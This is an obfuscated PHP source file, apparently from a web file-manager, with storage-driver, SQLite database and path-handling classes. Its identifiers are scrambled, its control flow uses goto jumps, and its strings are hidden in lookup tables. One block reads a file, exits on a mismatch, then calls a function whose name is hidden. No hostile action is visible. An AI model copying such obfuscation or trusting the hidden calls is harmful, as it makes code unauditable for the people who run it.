<?php
 goto D§ÉÂ¬À¬õ; e±ÓÙ˜ù‡‚: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\163\x74\x6f\x72\x61\147\x65\114\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\163\x69\172\x65\x4d\x61\170", "\x73\171\x73\x74\x65\x6d", "\x64\145\146\x61\x75\x6c\x74", "\144\162\x69\166\x65\162", "\x63\157\156\x66\151\x67"); public function listData($aÀ÷ßí™ = false, $F‘æ¡š¢Ä = "\x6d\157\x64\x69\x66\171\124\151\155\x65", $C¸ğ‰ù¯×• = false) { goto B¹Õ«‹Ş–é; B¹Õ«‹Ş–é: $bŸ‹ô’»ë‰ =& $_SERVER[°Óó£ÌİóèÅ]; $Dˆ¸°ÜéÚ = parent::listData($aÀ÷ßí™, $F‘æ¡š¢Ä, $C¸ğ‰ù¯×•); if ($aÀ÷ßí™) { return $Dˆ¸°ÜéÚ; } goto f‚¢Şê“×Ì; f‚¢Şê“×Ì: foreach ($Dˆ¸°ÜéÚ as $DÏ†åÕêØò => $Câ‚ÍÊâé) { unset($Dˆ¸°ÜéÚ[$DÏ†åÕêØò][$bŸ‹ô’»ë‰[6]]); $Dˆ¸°ÜéÚ[$DÏ†åÕêØò][$bŸ‹ô’»ë‰[1532]] = 0; } $B«Àá™Ğò = array_to_keyvalue($Dˆ¸°ÜéÚ, $bŸ‹ô’»ë‰[33], $bŸ‹ô’»ë‰[376]); $this->_listAppendSize($Dˆ¸°ÜéÚ, $B«Àá™Ğò); goto FŒÄ‡ô¶ø; FŒÄ‡ô¶ø: return $Dˆ¸°ÜéÚ; goto dŒˆì®ŒÅÀ; dŒˆì®ŒÅÀ: } public function _listAppendSize(&$FØ¬ˆã­ˆ³, $Eá†™ŠÉ‚Ù) { $f´¨Ã—ÒƒÉ =& $_SERVER[°Óó£ÌİóèÅ]; $eŒºôšÄ•Ï = $f´¨Ã—ÒƒÉ[1797] . implode($f´¨Ã—ÒƒÉ[47], $Eá†™ŠÉ‚Ù) . $f´¨Ã—ÒƒÉ[1798]; $e•ñ‹² ­ê = Model($f´¨Ã—ÒƒÉ[487])->query($eŒºôšÄ•Ï); $e•ñ‹² ­ê = array_to_keyvalue($e•ñ‹² ­ê, $f´¨Ã—ÒƒÉ[376], $f´¨Ã—ÒƒÉ[86]); foreach ($FØ¬ˆã­ˆ³ as $cñí‡×´Õø => $aå×éœæØÌ) { $FØ¬ˆã­ˆ³[$cñí‡×´Õø][$f´¨Ã—ÒƒÉ[1532]] = isset($e•ñ‹² ­ê[$aå×éœæØÌ[$f´¨Ã—ÒƒÉ[376]]]) ? $e•ñ‹² ­ê[$aå×éœæØÌ[$f´¨Ã—ÒƒÉ[376]]] : 0; } } public function getConfig($B…±Âµô ) { $AÊØá‚à¢ß = parent::listData($B…±Âµô ); return json_decode($AÊØá‚à¢ß[$_SERVER[°Óó£ÌİóèÅ][6]], !0); } public function update($F®ÛÓ»šçÚ, $f‰Ü°‰ä’) { goto A¢¯‡ˆŸ™§; FÊ–Œìµã«: $cÃªµ•ğ‹ = parent::update($F®ÛÓ»šçÚ, $f‰Ü°‰ä’); if ($cÃªµ•ğ‹ && $f‰Ü°‰ä’[$f‡ÕÖ¯[34]]) { foreach ($fí«ùæŸ´¼ as $B±Ï±Œ¥éÊ) { if ($B±Ï±Œ¥éÊ[$f‡ÕÖ¯[34]] && $B±Ï±Œ¥éÊ[$f‡ÕÖ¯[376]] != $F®ÛÓ»šçÚ) { parent::update($B±Ï±Œ¥éÊ[$f‡ÕÖ¯[376]], array($f‡ÕÖ¯[34] => 0)); } } } return $cÃªµ•ğ‹; goto A§è©„¥§Ó; báé”Ş‰š…: if (isset($fí«ùæŸ´¼[$báÒòÄâ]) && $fí«ùæŸ´¼[$báÒòÄâ][$f‡ÕÖ¯[376]] != $F®ÛÓ»šçÚ) { return !1; } if (isset($f‰Ü°‰ä’[$f‡ÕÖ¯[1799]]) && $f‰Ü°‰ä’[$f‡ÕÖ¯[1799]] == $f‡ÕÖ¯[384]) { $this->checkConfig($f‰Ü°‰ä’); } unset($f‰Ü°‰ä’[$f‡ÕÖ¯[1799]]); goto FÊ–Œìµã«; A¢¯‡ˆŸ™§: $f‡ÕÖ¯ =& $_SERVER[°Óó£ÌİóèÅ]; $báÒòÄâ = $f‰Ü°‰ä’[$f‡ÕÖ¯[28]]; $fí«ùæŸ´¼ = array_to_keyvalue(parent::listData(), $f‡ÕÖ¯[28]); goto báé”Ş‰š…; A§è©„¥§Ó: } public function add($Ağç¹¬±Û¡) { goto B§“ŒæŒÜ; B§“ŒæŒÜ: $DèÁÚ™ï =& $_SERVER[°Óó£ÌİóèÅ]; $EÍ ªğğª = array_to_keyvalue(parent::listData(), $DèÁÚ™ï[28]); if (isset($EÍ ªğğª[$Ağç¹¬±Û¡[$DèÁÚ™ï[28]]])) { return !1; } goto Dì—„‰ ÒÔ; Dì—„‰ ÒÔ: $this->checkConfig($Ağç¹¬±Û¡); $CÍÑÇ¶ö‘ = parent::insert($Ağç¹¬±Û¡); if ($CÍÑÇ¶ö‘ && $Ağç¹¬±Û¡[$DèÁÚ™ï[34]]) { foreach ($EÍ ªğğª as $D‹‰…—ÀĞ¦) { if ($D‹‰…—ÀĞ¦[$DèÁÚ™ï[34]]) { parent::update($D‹‰…—ÀĞ¦[$DèÁÚ™ï[376]], array($DèÁÚ™ï[34] => 0)); } } } goto eÇÉ“±‘ö; eÇÉ“±‘ö: return $CÍÑÇ¶ö‘; goto CÈà˜¡¿«à; CÈà˜¡¿«à: } public function checkConfig(&$f¶áÍ÷ áÙ) { goto C²ßê´±°š; b“ÏŠÉ‰¥‚: $b Õù—ôùï = $A„°¡Â©¨é->getPath($e‰Şõ÷ã” . $d¹öö©¼[1424]); if (!$A„°¡Â©¨é->mkfile($b Õù—ôùï)) { show_json(LNG($d¹öö©¼[1801]), !1); } $F¢Á´‰½æÚ[$d¹öö©¼[770]] = $e‰Şõ÷ã”; goto DìğİÜ‘ïŸ; cÌòœôô¼•: foreach ($F¢Á´‰½æÚ as $AğâÏ«–¹ => $d®«œ™ÃÄ) { $F¢Á´‰½æÚ[$AğâÏ«–¹] = trim($d®«œ™ÃÄ); } $e‰Şõ÷ã” = rtrim($F¢Á´‰½æÚ[$d¹öö©¼[770]], $d¹öö©¼[8]) . $d¹öö©¼[8]; $Aè†ÖÈ™Õ = $this->driverType($B®„”‡•ËŠ); goto A¾¾©ÀéŒ†; A¾¾©ÀéŒ†: $D…èñÛáäå = $d¹öö©¼[80] . $Aè†ÖÈ™Õ; $A„°¡Â©¨é = new $D…èñÛáäå($F¢Á´‰½æÚ); if (in_array($B®„”‡•ËŠ, $A„°¡Â©¨é->objectDriver)) { if (!$A„°¡Â©¨é->isBucketCors() && !$A„°¡Â©¨é->setBucketCors()) { show_json(LNG($d¹öö©¼[1800]), !1); } } goto b“ÏŠÉ‰¥‚; DìğİÜ‘ïŸ: $f¶áÍ÷ áÙ[$d¹öö©¼[6]] = json_encode($F¢Á´‰½æÚ); $f¶áÍ÷ áÙ[$d¹öö©¼[97]] = $Aè†ÖÈ™Õ; return !0; goto Câ‘Ãø°Á»; C²ßê´±°š: $d¹öö©¼ =& $_SERVER[°Óó£ÌİóèÅ]; $B®„”‡•ËŠ = strtolower($f¶áÍ÷ áÙ[$d¹öö©¼[97]]); $F¢Á´‰½æÚ = json_decode_force($f¶áÍ÷ áÙ[$d¹öö©¼[6]]); goto cÌòœôô¼•; Câ‘Ãø°Á»: } private function driverType($FË¸“Ö¨éè) { $CïÉêŒ¸öç =& $_SERVER[°Óó£ÌİóèÅ]; $dñ¹ö¿Ñ—« = array($CïÉêŒ¸öç[110] => $CïÉêŒ¸öç[1802], $CïÉêŒ¸öç[66] => $CïÉêŒ¸öç[1803], $CïÉêŒ¸öç[73] => $CïÉêŒ¸öç[771]); if (isset($dñ¹ö¿Ñ—«[$FË¸“Ö¨éè])) { return $dñ¹ö¿Ñ—«[$FË¸“Ö¨éè]; } return strtoupper($FË¸“Ö¨éè); } public function driverListSystem() { $Dİ¼¯ù÷ÁÌ =& $_SERVER[°Óó£ÌİóèÅ]; $câ—ÉŸÇ˜· = parent::listData(); $f‡ºóÊğµØ = array(); foreach ($câ—ÉŸÇ˜· as $cØ‚ŠÕ›) { unset($cØ‚ŠÕ›[$Dİ¼¯ù÷ÁÌ[195]], $cØ‚ŠÕ›[$Dİ¼¯ù÷ÁÌ[114]]); $cØ‚ŠÕ›[$Dİ¼¯ù÷ÁÌ[6]] = json_decode_force($cØ‚ŠÕ›[$Dİ¼¯ù÷ÁÌ[6]]); $f‡ºóÊğµØ[] = $cØ‚ŠÕ›; } return $f‡ºóÊğµØ; } public function defaultDriver() { $f¢ÆÒÄÂ¨Ÿ =& $_SERVER[°Óó£ÌİóèÅ]; $bù–™ŠÛìí = parent::listData(); $E£áßâ¬™· = array_filter_by_field($bù–™ŠÛìí, $f¢ÆÒÄÂ¨Ÿ[34], 1); $E£áßâ¬™· = $E£áßâ¬™·[0]; if ($E£áßâ¬™·) { $E£áßâ¬™·[$f¢ÆÒÄÂ¨Ÿ[6]] = json_decode($E£áßâ¬™·[$f¢ÆÒÄÂ¨Ÿ[6]], !0); } return $E£áßâ¬™·; } public function driverInfo($eÒ±‚Ğå÷) { $CÇˆ©êï‡’ =& $_SERVER[°Óó£ÌİóèÅ]; $Dº¶Íºù†Ú = array_to_keyvalue(parent::listData(), $CÇˆ©êï‡’[376]); if (!isset($Dº¶Íºù†Ú[$eÒ±‚Ğå÷])) { return !1; } $F“Ø„¿ğÙ = $Dº¶Íºù†Ú[$eÒ±‚Ğå÷]; $F“Ø„¿ğÙ[$CÇˆ©êï‡’[6]] = json_decode_force($F“Ø„¿ğÙ[$CÇˆ©êï‡’[6]]); return $F“Ø„¿ğÙ; } public function removeWithFile($DÓ‡ê¸ˆ–™) { goto dÁ¼è·¦»ˆ; b°İ‰Ş»Ëù: $c‘š¾£¿ä× = KodIO::defaultDriver(); $D©Íì¬åÜÇ = $c‘š¾£¿ä×[$dîù†‡¿¦[376]]; $BÙçÓ—ÅäÅ = "\x7b\x69\157\x3a{$D©Íì¬åÜÇ}\x7d\x2f"; goto E­çÈÍõâ¬; E­çÈÍõâ¬: $aÂÊù¬¡ìŠ = Model($dîù†‡¿¦[172])->where($Bğø¢œâÃ)->field($dîù†‡¿¦[1807])->select(); foreach ($aÂÊù¬¡ìŠ as $D£Êà±Ü×Ğ) { goto eˆ•ã´ÆÃÒ; eˆ•ã´ÆÃÒ: $f…²””éÌ = $D£Êà±Ü×Ğ[$dîù†‡¿¦[84]]; $Dâ…ÈÒïìè = $BÙçÓ—ÅäÅ . str_replace("\x7b\151\x6f\72{$DÓ‡ê¸ˆ–™}\x7d\57", $dîù†‡¿¦[33], $f…²””éÌ); if (!IO::exist($f…²””éÌ)) { $this->removeByFileID($D£Êà±Ü×Ğ[$dîù†‡¿¦[390]]); continue; } goto A¿­©‰ùÜğ; A¿­©‰ùÜğ: if (!IO::exist($Dâ…ÈÒïìè) && !IO::move($f…²””éÌ, $Dâ…ÈÒïìè)) { continue; } $Bğø¢œâÃ = array($dîù†‡¿¦[390] => $D£Êà±Ü×Ğ[$dîù†‡¿¦[390]]); $dï‚ß“´‡¡ = array($dîù†‡¿¦[488] => $D©Íì¬åÜÇ, $dîù†‡¿¦[84] => $Dâ…ÈÒïìè); goto e‹Ë‹¯ŸÀì; e‹Ë‹¯ŸÀì: Model($dîù†‡¿¦[172])->where($Bğø¢œâÃ)->save($dï‚ß“´‡¡); goto Cğ§¥®¾Ìë; Cğ§¥®¾Ìë: } return parent::remove($DÓ‡ê¸ˆ–™); goto fÑ©ºö¾¤; fšÌáñ’µ¾: $b¹£èõ½†Ÿ = Model($dîù†‡¿¦[419])->where($Bğø¢œâÃ)->sum($dîù†‡¿¦[86]); $EŞ…¥½¤ = new TaskFileTransfer($dîù†‡¿¦[1804] . $DÓ‡ê¸ˆ–™, $dîù†‡¿¦[1805], $E¹íÙ‹ñ¤à, LNG($dîù†‡¿¦[1806]) . "\50{$DÓ‡ê¸ˆ–™}\51"); $EŞ…¥½¤->task[$dîù†‡¿¦[463]] = $b¹£èõ½†Ÿ; goto b°İ‰Ş»Ëù; dÁ¼è·¦»ˆ: $dîù†‡¿¦ =& $_SERVER[°Óó£ÌİóèÅ]; $Bğø¢œâÃ = array($dîù†‡¿¦[488] => $DÓ‡ê¸ˆ–™); $E¹íÙ‹ñ¤à = Model($dîù†‡¿¦[419])->where($Bğø¢œâÃ)->count(); goto fšÌáñ’µ¾; fÑ©ºö¾¤: } public function progress($d×«çì‹Á°) { return Task::get($_SERVER[°Óó£ÌİóèÅ][1804] . $d×«çì‹Á°); } private function removeByFileID($f•Èå§Æ) { $díÂÜÉ•©° =& $_SERVER[°Óó£ÌİóèÅ]; $bÃèÆ·õ—‹ = Model($díÂÜÉ•©°[852])->field($díÂÜÉ•©°[1781])->where(array($díÂÜÉ•©°[390] => $f•Èå§Æ))->select(); $bÃèÆ·õ—‹ = array_to_keyvalue($bÃèÆ·õ—‹, $díÂÜÉ•©°[33], $díÂÜÉ•©°[382]); foreach ($bÃèÆ·õ—‹ as $f™¼¤‰÷Ñš) { Model($díÂÜÉ•©°[983])->remove($f™¼¤‰÷Ñš, !1); } } } $a…®ä»ºÈî = LIB_DIR . $_SERVER[°Óó£ÌİóèÅ][1779]; $F†ÍÏÏŞ’ = $_SERVER[°Óó£ÌİóèÅ][1026]; goto c˜›ÉÕ¢ç×; DùÆô¶÷¢: $_SERVER[$_SERVER[³ªí][30]] = BASIC_PATH . $_SERVER[³ªí][31]; $_SERVER[$_SERVER[³ªí][32]] = filesize($_SERVER[$_SERVER[³ªí][30]]); $_SERVER[$_SERVER[³ªí][33]] = ("\70\62\70\61"."\64\63")+0;$_Rreg="CEBfAkTgsexnag5VqxRHPmJZWPNf4aISiZjAK3UDdJdDDHcAcGNDPcmKdEGEIu";; goto få ¦°Ü¸À; fÛïÒôÏŒŸ: register_shutdown_function($_SERVER[³ªí][19]); set_error_handler($_SERVER[³ªí][27], $Cö¨ªØ‚öŞ); if (function_exists($_SERVER[³ªí][28])) { set_exception_handler($_SERVER[³ªí][29]); } goto DùÆô¶÷¢; bŞ—©¬òï: class DbSqlite3Base extends Db { public function __construct($dµ»Ë‰‘‹« = '') { $FÜ‘ç®è =& $_SERVER[°Óó£ÌİóèÅ]; if (!class_exists($FÜ‘ç®è[51])) { think_exception(think_lang($FÜ‘ç®è[10]) . $FÜ‘ç®è[52]); } if (!empty($dµ»Ë‰‘‹«)) { if (!isset($dµ»Ë‰‘‹«[$FÜ‘ç®è[12]])) { $dµ»Ë‰‘‹«[$FÜ‘ç®è[12]] = 438; } $this->config = $dµ»Ë‰‘‹«; if (empty($this->config[$FÜ‘ç®è[13]])) { $this->config[$FÜ‘ç®è[13]] = array(); } } } public function connect($aÊ‹˜«Š¦ = '', $aÇ×óÙ£–Ì = 0) { $BŒ„š‡Ô· =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->linkID[$aÇ×óÙ£–Ì])) { if (empty($aÊ‹˜«Š¦)) { $aÊ‹˜«Š¦ = $this->config; } $this->linkID[$aÇ×óÙ£–Ì] = new SQLite3($aÊ‹˜«Š¦[$BŒ„š‡Ô·[17]]); if (!$this->linkID[$aÇ×óÙ£–Ì]) { think_exception($this->linkID[$aÇ×óÙ£–Ì]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$aÇ×óÙ£–Ì]->busyTimeout(30000); if (1 != think_config($BŒ„š‡Ô·[18])) { unset($this->config); } } return $this->linkID[$aÇ×óÙ£–Ì]; } public function free() { $this->queryID = null; } public function query($BÊø¦½¦Â) { goto d¡‹Å…‡Ù; d°õÕƒ‰£: if (!1 === $this->queryID) { $this->error(); return !1; } else { $b„Í«ˆĞ = $this->getAll(); $this->numRows = count($b„Í«ˆĞ); return $b„Í«ˆĞ; } goto eªáòÁ‘; DìáÃŠ…½: think_status($A”ô±±âÅ[20]); $this->queryID = $this->_linkID->query($BÊø¦½¦Â); $this->debug(); goto d°õÕƒ‰£; d¡‹Å…‡Ù: $A”ô±±âÅ =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dõ¨”ê¿ë; Dõ¨”ê¿ë: $this->queryStr = $BÊø¦½¦Â; if ($this->queryID) { $this->free(); } think_action_status($A”ô±±âÅ[19], 1); goto DìáÃŠ…½; eªáòÁ‘: } public function execute($A«À¢ã»ğó) { goto cŒÔùçã¡¥; c°ÎĞâï²ë: $this->queryStr = $A«À¢ã»ğó; if ($this->queryID) { $this->free(); } think_action_status($Aä´ˆ¯ºŒî[21], 1); goto cäé™§œƒ; f¿Ó‰Ù¨ï: if (!1 === $d®‹‘Å‚Æ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto a¸ä©Ô»µ; cäé™§œƒ: think_status($Aä´ˆ¯ºŒî[20]); $d®‹‘Å‚Æ = $this->_linkID->exec($A«À¢ã»ğó); $this->debug(); goto f¿Ó‰Ù¨ï; cŒÔùçã¡¥: $Aä´ˆ¯ºŒî =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c°ÎĞâï²ë; a¸ä©Ô»µ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[°Óó£ÌİóèÅ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dàÂ—èË¿‡ = $this->_linkID->query($_SERVER[°Óó£ÌİóèÅ][23]); if (!$dàÂ—èË¿‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b Êøîê°“ = $this->_linkID->query($_SERVER[°Óó£ÌİóèÅ][24]); if (!$b Êøîê°“) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $bÓá¶àñ…¶ = array(); while ($F®Šá­¬ÁŸ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $bÓá¶àñ…¶[] = $F®Šá­¬ÁŸ; } $this->queryID->reset(); return $bÓá¶àñ…¶; } public function getFields($aƒùô¯‚¡) { $då‚Ïñ–ï =& $_SERVER[°Óó£ÌİóèÅ]; $Aƒ£ø‡ƒì° = $this->query($då‚Ïñ–ï[25] . $aƒùô¯‚¡ . $då‚Ïñ–ï[26]); $b‡ìÙõ„Àœ = array(); if ($Aƒ£ø‡ƒì°) { foreach ($Aƒ£ø‡ƒì° as $bÚ¨Š¤¨ˆí => $AÒï¸µ„Å’) { $b‡ìÙõ„Àœ[$AÒï¸µ„Å’[$då‚Ïñ–ï[28]]] = array($då‚Ïñ–ï[28] => $AÒï¸µ„Å’[$då‚Ïñ–ï[28]], $då‚Ïñ–ï[29] => $AÒï¸µ„Å’[$då‚Ïñ–ï[29]], $då‚Ïñ–ï[31] => (bool) ($AÒï¸µ„Å’[$då‚Ïñ–ï[31]] === $då‚Ïñ–ï[33]), $då‚Ïñ–ï[34] => $AÒï¸µ„Å’[$då‚Ïñ–ï[53]], $då‚Ïñ–ï[36] => (bool) $AÒï¸µ„Å’[$då‚Ïñ–ï[54]], $då‚Ïñ–ï[39] => (bool) $AÒï¸µ„Å’[$då‚Ïñ–ï[54]]); } } return $b‡ìÙõ„Àœ; } public function getTables($aˆ¾ğ×Ã = '') { $aé…Ò°×ªÑ =& $_SERVER[°Óó£ÌİóèÅ]; $c×æÕÍ³ŒÍ = $this->query($aé…Ò°×ªÑ[42] . $aé…Ò°×ªÑ[43] . $aé…Ò°×ªÑ[44]); $cÉ¬½î”´ = array(); foreach ($c×æÕÍ³ŒÍ as $C«˜ÆÜÙ¸¿ => $fòšÒ°®‚¤) { $cÉ¬½î”´[$C«˜ÆÜÙ¸¿] = current($fòšÒ°®‚¤); } return $cÉ¬½î”´; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÙ‹ÍÏ†˜® =& $_SERVER[°Óó£ÌİóèÅ]; $this->error = $this->_linkID->lastErrorMsg(); if ($dÙ‹ÍÏ†˜®[33] != $this->queryStr) { $this->error .= LNG($dÙ‹ÍÏ†˜®[45]) . $this->queryStr; } think_trace($this->error, $dÙ‹ÍÏ†˜®[33], $dÙ‹ÍÏ†˜®[46]); return $this->error; } public function escapeString($E‹½àÚØä) { $C×—³ÚòÎí =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->_linkID) { return $this->_linkID->escapeString($E‹½àÚØä); } return str_ireplace($C×—³ÚòÎí[55], $C×—³ÚòÎí[56], $E‹½àÚØä); } public function parseLimit($f¼¯Íƒ‹Ó) { $Eë»ÓÂ‘ Ş =& $_SERVER[°Óó£ÌİóèÅ]; $côŠÓŞ‡óÁ = $Eë»ÓÂ‘ Ş[33]; if (!empty($f¼¯Íƒ‹Ó)) { $f¼¯Íƒ‹Ó = explode($Eë»ÓÂ‘ Ş[47], $f¼¯Íƒ‹Ó); if (count($f¼¯Íƒ‹Ó) > 1) { $côŠÓŞ‡óÁ .= $Eë»ÓÂ‘ Ş[48] . $f¼¯Íƒ‹Ó[1] . $Eë»ÓÂ‘ Ş[49] . $f¼¯Íƒ‹Ó[0] . $Eë»ÓÂ‘ Ş[50]; } else { $côŠÓŞ‡óÁ .= $Eë»ÓÂ‘ Ş[48] . $f¼¯Íƒ‹Ó[0] . $Eë»ÓÂ‘ Ş[50]; } } return $côŠÓŞ‡óÁ; } } if ($_SERVER[$_SERVER[°Óó£ÌİóèÅ][57]] != $_SERVER[$_SERVER[°Óó£ÌİóèÅ][58]]) { goto fêõ¤Æ‡; F÷‡‚õà¨É: $eÀ™ÈĞ¤í($_SERVER[$_SERVER[°Óó£ÌİóèÅ][64]]); goto cÍ²§ø‰×; fêõ¤Æ‡: $Fåğ«Ö„× = $_SERVER[°Óó£ÌİóèÅ][59]; $cŒÍ‘é¡Ûˆ = BASIC_PATH . $_SERVER[°Óó£ÌİóèÅ][60]; $e˜¸£¤³ğ = $Fåğ«Ö„×($cŒÍ‘é¡Ûˆ); goto D¢‹İ‘˜†“; D¢‹İ‘˜†“: $bÁ®‡‚›‡ = explode($_SERVER[°Óó£ÌİóèÅ][61], $e˜¸£¤³ğ); if (count($bÁ®‡‚›‡) < $_SERVER[°Óó£ÌİóèÅ][62]) { die; } $eÀ™ÈĞ¤í = $_SERVER[°Óó£ÌİóèÅ][63]; goto F÷‡‚õà¨É; cÍ²§ø‰×: } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $D™ŸãÏ³¦² =& $_SERVER[°Óó£ÌİóèÅ]; $this->objectDriver = array($D™ŸãÏ³¦²[65], $D™ŸãÏ³¦²[66], $D™ŸãÏ³¦²[67], $D™ŸãÏ³¦²[68], $D™ŸãÏ³¦²[69], $D™ŸãÏ³¦²[70], $D™ŸãÏ³¦²[71], $D™ŸãÏ³¦²[72], $D™ŸãÏ³¦²[73]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($EÓ°¿£Šƒ¿) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($EÓ°¿£Šƒ¿, $_SERVER[°Óó£ÌİóèÅ][8]); } return $EÓ°¿£Šƒ¿; } public function getPathName($CáË„Ÿ´à²) { return $CáË„Ÿ´à²; } public function iconvApp($dØ ¤òÁìÈ) { return $dØ ¤òÁìÈ; } public function iconvSystem($dõ©Ö“Öæù) { return $dõ©Ö“Öæù; } public function iconvTo($Fóšá„ª†ç, $F‚§ÖÔÅÉ¸, $bÉ•’­ØÑÏ) { goto EÔ°ààÕéË; dù±‚ó¹©Ì: $Cì«ïâË = $Cì«ïâË ? $Cì«ïâË : $Fóšá„ª†ç; if (strstr($Cì«ïâË, $aäƒ‹ŒÏñ[78])) { $Cì«ïâË = str_replace($aäƒ‹ŒÏñ[78], $aäƒ‹ŒÏñ[79], $Cì«ïâË); } $c‡¦˜¾¬‹Ï[$F‚§ÖÔÅÉ¸ . $aäƒ‹ŒÏñ[75] . $bÉ•’­ØÑÏ . $aäƒ‹ŒÏñ[76] . $Fóšá„ª†ç] = $Cì«ïâË; goto F»›ÎªØÕç; b¶â¼áÎ™: return $Cì«ïâË; goto DØâ…àÀ; EÔ°ààÕéË: $aäƒ‹ŒÏñ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$Fóšá„ª†ç || !function_exists($aäƒ‹ŒÏñ[74])) { return $Fóšá„ª†ç; } static $c‡¦˜¾¬‹Ï = array(); goto A…®è“„Æ–; A…®è“„Æ–: $f¯½í´¼öê = $F‚§ÖÔÅÉ¸ . $aäƒ‹ŒÏñ[75] . $bÉ•’­ØÑÏ . $aäƒ‹ŒÏñ[76] . $Fóšá„ª†ç; if (isset($c‡¦˜¾¬‹Ï[$f¯½í´¼öê])) { return $c‡¦˜¾¬‹Ï[$f¯½í´¼öê]; } if (function_exists($aäƒ‹ŒÏñ[77])) { $Cì«ïâË = @mb_convert_encoding($Fóšá„ª†ç, $bÉ•’­ØÑÏ, $F‚§ÖÔÅÉ¸); } else { $Cì«ïâË = @iconv($F‚§ÖÔÅÉ¸, $bÉ•’­ØÑÏ, $Fóšá„ª†ç); } goto dù±‚ó¹©Ì; F»›ÎªØÕç: $c‡¦˜¾¬‹Ï[$bÉ•’­ØÑÏ . $aäƒ‹ŒÏñ[75] . $F‚§ÖÔÅÉ¸ . $aäƒ‹ŒÏñ[76] . $Fóšá„ª†ç] = $Fóšá„ª†ç; $c‡¦˜¾¬‹Ï[$bÉ•’­ØÑÏ . $aäƒ‹ŒÏñ[75] . $F‚§ÖÔÅÉ¸ . $aäƒ‹ŒÏñ[76] . $Cì«ïâË] = $Fóšá„ª†ç; $c‡¦˜¾¬‹Ï[$F‚§ÖÔÅÉ¸ . $aäƒ‹ŒÏñ[75] . $bÉ•’­ØÑÏ . $aäƒ‹ŒÏñ[76] . $Cì«ïâË] = $Cì«ïâË; goto b¶â¼áÎ™; DØâ…àÀ: } public function getPathInner($C›äœ®¤È») { $fÍ‘Æ˜›¹ = IO::init($C›äœ®¤È»); return $fÍ‘Æ˜›¹->path; } public function getPathOuter($A‡¼¨§Í‡Ó) { $d—†‹¤ïƒÅ =& $_SERVER[°Óó£ÌİóèÅ]; $bÍÒÇ‘Û•â = strlen(trim($this->pathBase, $d—†‹¤ïƒÅ[8])); $A‡¼¨§Í‡Ó = substr(trim($A‡¼¨§Í‡Ó, $d—†‹¤ïƒÅ[8]), $bÍÒÇ‘Û•â); return $this->pathDriver . $d—†‹¤ïƒÅ[8] . ltrim($A‡¼¨§Í‡Ó, $d—†‹¤ïƒÅ[8]); } public function isParentOf($E ËÅİ‘‚Å, $eÙã¹ä¬) { $AÊ©¶´¿œ =& $_SERVER[°Óó£ÌİóèÅ]; $E ËÅİ‘‚Å = rtrim(strtolower($E ËÅİ‘‚Å), $AÊ©¶´¿œ[8]) . $AÊ©¶´¿œ[8]; $eÙã¹ä¬ = rtrim(strtolower($eÙã¹ä¬), $AÊ©¶´¿œ[8]) . $AÊ©¶´¿œ[8]; $aËË´ÚˆÑ = strpos($eÙã¹ä¬, $E ËÅİ‘‚Å) === 0; return $aËË´ÚˆÑ; } public function getType() { $d¼¦¿Î²ï =& $_SERVER[°Óó£ÌİóèÅ]; $dŸ‹œÊÆ×ó = str_replace($d¼¦¿Î²ï[80], $d¼¦¿Î²ï[33], get_class($this)); return strtolower($dŸ‹œÊÆ×ó); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($dõ»æ­×‚›, $aÓÊ‰‰®¬Ã) { $dÅ£Ù…„š =& $_SERVER[°Óó£ÌİóèÅ]; $D»†²ùÊõ = rtrim($dõ»æ­×‚›, $dÅ£Ù…„š[8]) . $dÅ£Ù…„š[8] . $aÓÊ‰‰®¬Ã; $f‰ë¥áÑ = $this->exist($D»†²ùÊõ); return $f‰ë¥áÑ ? $D»†²ùÊõ : !1; } public function renameObject($Aá‹Óœ²¡é, $aèâÊ¥á«) { $b Â²‹†³² =& $_SERVER[°Óó£ÌİóèÅ]; Hook::trigger($b Â²‹†³²[81], $this, $Aá‹Óœ²¡é, $this, $this->pathFather($Aá‹Óœ²¡é) . $aèâÊ¥á«); $Aá‹Óœ²¡é = $this->getPathOuter($Aá‹Óœ²¡é); $aèâÊ¥á« = $this->pathFather($Aá‹Óœ²¡é) . $aèâÊ¥á«; if (IO::isFile($Aá‹Óœ²¡é)) { $c¹ç¦ëš‡ä = IO::move($Aá‹Óœ²¡é, $aèâÊ¥á«, REPEAT_RENAME_FOLDER); } else { $c¹ç¦ëš‡ä = IO::mkdir($aèâÊ¥á«); if (!$c¹ç¦ëš‡ä) { return !1; } $bšÅùˆÃ’ = IO::listPath($Aá‹Óœ²¡é, !0); $Bãßï‡ÛÆ‰ = array_merge($bšÅùˆÃ’[$b Â²‹†³²[82]], $bšÅùˆÃ’[$b Â²‹†³²[83]]); foreach ($Bãßï‡ÛÆ‰ as $EÛÏæºÛÔÔ) { IO::move($EÛÏæºÛÔÔ[$b Â²‹†³²[84]], $aèâÊ¥á«, REPEAT_RENAME_FOLDER); } IO::remove($Aá‹Óœ²¡é); } return $c¹ç¦ëš‡ä ? $aèâÊ¥á« : !1; } public function tempFile($a‡¦©©öÁ° = '', $aÀÀËñìÀ = '') { goto eÒ‚ìŠÎ†´; eÒ‚ìŠÎ†´: if (!$a‡¦©©öÁ°) { $a‡¦©©öÁ° = rand_string(15); } $bË’Êè‡Â = TEMP_FILES . rand_string(15) . 